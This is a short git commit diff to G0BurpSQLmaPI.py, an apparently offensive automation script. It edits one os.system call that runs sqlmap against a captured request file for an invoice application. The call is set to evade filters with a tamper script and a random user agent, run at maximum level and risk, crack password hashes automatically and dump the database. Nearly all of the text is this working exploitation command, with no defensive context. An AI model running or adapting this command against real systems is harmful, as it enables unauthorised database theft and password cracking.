6d8bbab7e27eeaf6436d690d74a2702aa8a707ba
nu11secur1ty <venvaropt@gmail.com>
2024-04-30 11:05:04 +0300

    Update G0BurpSQLmaPI.py

--- program/Framework-Advanced-Auto/G0BurpSQLmaPI.py
+++ program/Framework-Advanced-Auto/G0BurpSQLmaPI.py
@@ -17,7 +17,7 @@ print(Style.RESET_ALL)
 # Here you can modify your OWN injection construction!
 # Your EXPLOIT ENVIRONMENT 
 env = 'C:\\Users\\nu11secur1ty\\Desktop\\RUPPEINVOICE-1.0\\SQLi\\'
-os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --dbms=mysql '+param_spec+' --tamper=space2comment --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt -p '+param_spec+' --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
 
 print(Fore.RED +"Happy hunting with nu11secur1ty =)")
 print(Style.RESET_ALL)
